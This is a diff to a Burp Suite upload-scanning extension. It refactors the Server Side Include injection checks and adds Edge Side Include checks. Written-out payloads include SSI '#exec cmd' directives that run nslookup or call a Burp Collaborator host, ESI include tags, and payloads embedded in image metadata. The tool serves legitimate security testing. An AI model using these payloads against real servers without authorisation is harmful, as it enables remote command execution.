@@ -431,7 +431,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # See also what file extensions the .htaccess module would enable!
         # It is unlikely that a server accepts content type text/html...
         self.SSI_TYPES = {
-            ('', '.shtml', 'text/plain'),
+            #('', '.shtml', 'text/plain'),
             ('', '.shtml', 'text/html'),
             #('', '.stm', 'text/html'),
             #('', '.shtm', 'text/html'),
@@ -989,8 +989,9 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # SSI - generic
             if injector.opts.modules['ssi'].isSelected():
-                print "\nDoing SSI checks"
+                print "\nDoing SSI/ESI checks"
                 colab_tests.extend(self._ssi(injector, burp_colab))
+                colab_tests.extend(self._esi(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # XXE - generic
             if injector.opts.modules['xxe'].isSelected():
@@ -2074,34 +2075,53 @@ Response.write(a&c&b)
 
         return colab_tests
 
+    def _ssi_payload(self):
+        non_existant_domain = "{}{}{}.{}{}{}.local".format(str(random.randint(100000, 999999)),
+                                                           str(random.randint(100000, 999999)),
+                                                           str(random.randint(100000, 999999)),
+                                                           str(random.randint(100000, 999999)),
+                                                           str(random.randint(100000, 999999)),
+                                                           str(random.randint(100000, 999999)))
+        expect = " can't find " + non_existant_domain
+        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
+        return content, expect
+
     def _ssi(self, injector, burp_colab):
         issue_name = "SSI injection"
         severity = "High"
         confidence = "Certain"
 
-        # reflected nslookup output
+        # Reflected nslookup
         # TODO feature: This might fail if the DNS is responding with default DNS entries, then it won't say "can't find" and the
         # domain but I couldn't come up with anything better for SSI except Burp collaborator payloads and this...
         # At least "can't find" + domain is present in Linux and Windows nslookup output
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectNslookup"
-        non_existant_domain = "{}{}{}.{}{}{}.local".format(str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)))
-        expected_download_content = " can't find " + non_existant_domain
-        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
-        detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
-                 "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
-                 "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
-                 "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
-                 "<br><br>{}<br><br> The found string in a response was: " \
-                 "<br>{}<br><br>".format(cgi.escape(content), cgi.escape(expected_download_content))
+        main_detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
+                      "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
+                      "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
+                      "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
+                      "<br><br>{}<br><br> The found string in a response was: " \
+                      "<br>{}<br><br>"
 
+        # Reflected nslookup - Simple
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDnsSimple"
+        content, expect = self._ssi_payload()
+        detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
         issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
-        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content))
+        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
         self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)
+
+        # Reflected nslookup - File metadata
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDns" + name
+            detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
+            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
+            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+            self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)
+
+        # TODO: Decide if additional sleep based payloads would make sense, probably rather not
 
         # Burp community edition doesn't have Burp collaborator
         if not burp_colab:
@@ -2109,47 +2129,99 @@ Response.write(a&c&b)
 
         colab_tests = []
 
-        # burp collaborator
+        # RCE with Burp collaborator
         base_detail = "A burp collaborator interaction was dectected when uploading an Server Side Include file with a payload that " \
                 "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. Note that if " \
                 "you enabled the .htaccess module as well, this attack might have only succeeded because we were " \
                 "already able to upload a .htaccess file that enables SSI. "
 
-        # TODO: Decide if additional sleep based payloads would make sense, probably rather not
-
-        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
-        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
-        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
-        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
-        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
-        size = (injector.opts.image_width, injector.opts.image_height)
-        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
-            desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
-                   'Burp Collaborator payload with {} inside the uploaded file. ' \
-                   '<br>Interactions: <br><br>'.format(name, cmd_name)
-            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, "Certain", "High")
-            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
-                                                       content, issue, replace=ssicolab.placeholder, redownload=True))
-
-        # Plain SSI files
+        # RCE with Burp collaborator - Simple
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
             basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiColab" + cmd_name
             content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
             detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
             issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
-                                              content, issue, replace=replace, redownload=True))
+                                                       content, issue, replace=replace, redownload=True))
+
+        # RCE with Burp collaborator - File metadata
+        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
+        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
+        base_desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
+                    'Burp Collaborator payload with {} inside the uploaded file. ' \
+                    '<br>Interactions: <br><br>'
+        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
+        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
+            desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
+            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
+            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
+                                                       content, issue, replace=ssicolab.placeholder, redownload=True))
+
+        return colab_tests
+
+    def _esi_payload(self):
+        one = ''.join(random.sample(string.ascii_letters, 5))
+        two = ''.join(random.sample(string.ascii_letters, 5))
+        three = ''.join(random.sample(string.ascii_letters, 5))
+        content = '{}<!--esi-->{}<!--esx-->{}'.format(one, two, three)
+        expect = '{}{}<!--esx-->{}'.format(one, two, three)
+        return content, expect
+
+    def _esi(self, injector, burp_colab):
+        issue_name = "ESI injection"
+        severity = "High"
+        confidence = "Certain"
+
+        # Reflected stripped esi tag
+        base_detail = "When uploading an Edge Side Include file with a payload of {}, the server later responded with " \
+                      "{} only. This means that ESI might be enabled. The payload was an Edge Side Include (ESI) tag, see " \
+                      "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "
+
+        # Reflected stripped esi tag - Simple
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflectSimple"
+        content, expect = self._esi_payload()
+        detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
+        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+        self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)
+
+        # Reflected nslookup - File metadata
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflect" + name
+            detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
+            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
+            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+            self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)
+
+        # Burp community edition doesn't have Burp collaborator
+        if not burp_colab:
+            return []
+
+        colab_tests = []
 
         # ESI injection - includes remote URL -> burp collaborator
+        # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
+        # this is unlikely to be successfully triggered
         basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiColab"
         content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(BurpExtender.MARKER_COLLAB_URL, BurpExtender.MARKER_CACHE_DEFEAT_URL)
         detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
-                "includes a burp collaborator URL. The payload was a Edge Side Include (ESI) tag, see " \
-                "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. <br>Interactions: <br><br>"
-        issue = self._create_issue_template(injector.get_brr(), "Edge Side Include (ESI)", detail, confidence, severity)
+                 "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
+                 "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
+                 "that ESI attacks result in successful Burp Collaborator interactions, this is also likely to " \
+                 "be a Squid proxy, which is one of the few proxies that support that.<br>Interactions: <br><br>"
+        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
         colab_tests.extend(self._send_collaborator(injector, burp_colab, self.ESI_TYPES, basename,
                                                    content, issue, redownload=True))
+
+        # Not doing the metadata file + Burp Collaborator approach here, as that seems to be a waste of requests as explained
+        # on https://github.com/modzero/mod0BurpUploadScanner/issues/11
 
         return colab_tests
 
@@ -2380,11 +2452,7 @@ Response.write(a&c&b)
     def _xss_backdoored_file(self, injector):
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
-        # I don't think we need to test all of them, as usually they will just be returned as the Content-Type
-        # of the image and therefore not lead to XSS
-        formats_not_used = {".gif", ".bmp", ".png"}
-        used_formats = set(BackdooredFile.EXTENSION_TO_MIME.keys()).intersection(injector.opts.get_enabled_file_formats()) - formats_not_used
-        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload, formats=used_formats):
+        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload):
             basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfXss" + name
             title = "Cross-site scripting (stored)" # via " + ext[1:].upper() + " Metadata"
             desc = 'XSS through injection of HTML in Metadata of type ' + name + '. The server ' \
@@ -5159,7 +5227,7 @@ class BackdooredFile:
                                     padded_payload = payload + " " * padding
                                     c = new_content.replace(thumbnail_image_cont, padded_payload)
                                     if payload in c:
-                                        yield payload, expect, "PayloadAs" + name, ext, c
+                                        yield payload, expect, "Pa" + name, ext, c
                         if payload_placeholder in new_content:
                             c = new_content.replace(payload_placeholder, payload)
                             if payload in c:
@@ -7963,7 +8031,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         self.module_labels['asp'], self.modules['asp'] = self.checkbox('ASP:', True)
         self.module_labels['htaccess'], self.modules['htaccess'] = self.checkbox('htaccess/web.config:', True)
         self.module_labels['cgi'], self.modules['cgi'] = self.checkbox('CGI (Perl, Python, Ruby):', True)
-        self.module_labels['ssi'], self.modules['ssi'] = self.checkbox('Server Side Include:', True)
+        self.module_labels['ssi'], self.modules['ssi'] = self.checkbox('Server/Edge Side Include:', True)
         self.module_labels['xxe'], self.modules['xxe'] = self.checkbox('XXE (XML, SVG, Office Docs, XMP):', True)
         self.module_labels['xss'], self.modules['xss'] = self.checkbox('XSS (html, SVG, xssproject.swf):', True)
         self.module_labels['eicar'], self.modules['eicar'] = self.checkbox('Eicar:', True)
